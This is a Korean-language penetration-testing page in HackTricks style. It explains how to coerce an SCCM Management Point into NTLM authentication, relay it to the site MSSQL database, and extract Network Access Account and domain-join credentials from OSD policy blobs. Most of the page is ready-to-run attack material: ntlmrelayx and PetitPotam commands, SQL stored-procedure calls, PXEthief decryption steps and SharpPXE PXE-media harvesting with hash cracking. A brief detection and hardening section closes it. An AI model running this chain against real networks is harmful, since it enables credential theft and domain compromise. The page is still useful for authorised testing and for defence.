# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
**System Center Configuration Manager (SCCM) Management Point (MP)**가 SMB/RPC를 통해 인증하도록 유도하고 해당 NTLM machine account를 **site database (MSSQL)**로 **relaying**하면 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 권한을 획득할 수 있습니다.  이러한 role을 사용하면 **Operating System Deployment (OSD)** policy blob(Network Access Account credentials, Task-Sequence variables 등)을 노출하는 일련의 stored procedure를 호출할 수 있습니다.  이 blob은 hex-encoded/encrypted 상태이지만 **PXEthief**를 사용해 decode 및 decrypt할 수 있으며, 그 결과 plaintext secrets를 얻을 수 있습니다.<sup>[[2]](#references)</sup>

High-level chain:
1. MP 및 site DB 탐색 ↦ 인증이 필요 없는 HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` 시작.
3. **PetitPotam**, PrinterBug, DFSCoerce 등을 사용해 MP coercion.
4. SOCKS proxy를 통해 `mssqlclient.py -windows-auth`로 relay된 **<DOMAIN>\\<MP-host>$** account로 연결.
5. 다음을 실행:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`  (또는 `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM을 제거하고, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`를 실행합니다.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` 등의 secrets를 PXE 또는 clients에 접근하지 않고 복구할 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. 인증이 필요 없는 MP endpoints 열거
MP ISAPI extension **GetAuth.dll**은 인증이 필요 없는 여러 parameter를 노출합니다(site가 PKI-only인 경우는 제외):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | site signing cert public key와 *x86* / *x64* **All Unknown Computers** devices의 GUID를 반환합니다. |
| `MPLIST` | site 내 모든 Management-Point를 나열합니다. |
| `SITESIGNCERT` | Primary-Site signing certificate를 반환합니다(LDAP 없이 site server 식별). |

이후 DB queries에서 **clientID**로 사용할 GUID를 가져옵니다:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP machine account를 MSSQL로 Relay
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
coercion이 실행되면 다음과 비슷한 내용을 확인할 수 있습니다:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 저장 프로시저를 통해 OSD policies 식별
SOCKS proxy(기본 포트: 1080)를 통해 연결합니다:<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB로 전환합니다(3자리 site code를 사용합니다. 예: `CM_001`).

### 3.1 Unknown-Computer GUID 찾기 (선택 사항)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  할당된 정책 나열
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
각 행에는 `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`가 포함됩니다.

다음 정책에 집중합니다:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – run-as accounts를 포함할 수 있음

### 3.3 전체 body 가져오기
이미 `PolicyID` 및 `PolicyVersion`을 보유한 경우 다음을 사용하여 clientID 요구 사항을 건너뛸 수 있습니다:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 중요: SSMS에서 “Maximum Characters Retrieved” 값을 65535보다 크게 늘리세요. 그렇지 않으면 blob이 잘립니다.

---

## 4. blob 디코딩 및 복호화
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
복구된 비밀 정보 예시:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 관련 SQL roles 및 procedures
relay 후 login은 다음에 매핑됩니다:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

이러한 roles는 수십 개의 EXEC permissions를 노출하며, 이 attack에서 사용되는 주요 항목은 다음과 같습니다:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID`에 적용된 policies를 나열합니다. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 전체 policy body를 반환합니다. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path를 통해 반환됩니다. |

전체 목록은 다음과 같이 확인할 수 있습니다:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **UDP/4011을 통한 PXE 응답**: PXE로 구성된 Distribution Point에 PXE boot request를 전송합니다. proxyDHCP 응답에는 `SMSBoot\\x64\\pxe\\variables.dat`(암호화된 config) 및 `SMSBoot\\x64\\pxe\\boot.bcd`와 같은 boot path와 선택적 암호화 key blob이 포함됩니다.<sup>[[4]](#references)</sup>
* **TFTP를 통한 boot artifact 수집**: 반환된 path를 사용해 TFTP로 `variables.dat`를 다운로드합니다(인증 불필요). 파일은 작으며(수 KB) 암호화된 media variable을 포함합니다.
* **복호화 또는 crack**:
- 응답에 decryption key가 포함된 경우 **SharpPXE**에 전달해 `variables.dat`를 직접 복호화합니다.
- key가 제공되지 않는 경우(PXE media가 custom password로 보호됨), SharpPXE가 offline cracking을 위한 **Hashcat-compatible** `$sccm$aes128$...` hash를 출력합니다. password를 복구한 후 파일을 복호화합니다.
* **복호화된 XML 파싱**: plaintext variable에는 SCCM deployment metadata(**Management Point URL**, **Site Code**, media GUID 및 기타 identifier)가 포함됩니다. SharpPXE는 이를 파싱하고, 후속 abuse를 위해 GUID/PFX/site parameter가 미리 입력된 실행 가능한 **SharpSCCM** command를 출력합니다.
* **Requirements**: PXE listener(UDP/4011) 및 TFTP에 대한 network reachability만 필요하며, local admin privilege는 필요하지 않습니다.

---

## 7. Detection & Hardening
1. **MP login 모니터링** – MP computer account가 자신의 host가 아닌 IP에서 login하는 경우는 대략 relay를 의미합니다.<sup>[[1]](#references)</sup>
2. Site database에서 **Extended Protection for Authentication (EPA)**를 활성화합니다(`PREVENT-14`).
3. 사용하지 않는 NTLM을 비활성화하고 SMB signing을 강제하며 RPC를 제한합니다(
`PetitPotam`/`PrinterBug`에 사용되는 것과 동일한 mitigation).
4. IPSec / mutual-TLS를 사용해 MP ↔ DB communication을 harden합니다.
5. **PXE exposure 제한** – UDP/4011 및 TFTP를 trusted VLAN으로 방화벽 제한하고, PXE password를 요구하며, `SMSBoot\\*\\pxe\\variables.dat`의 TFTP download를 alert합니다.<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
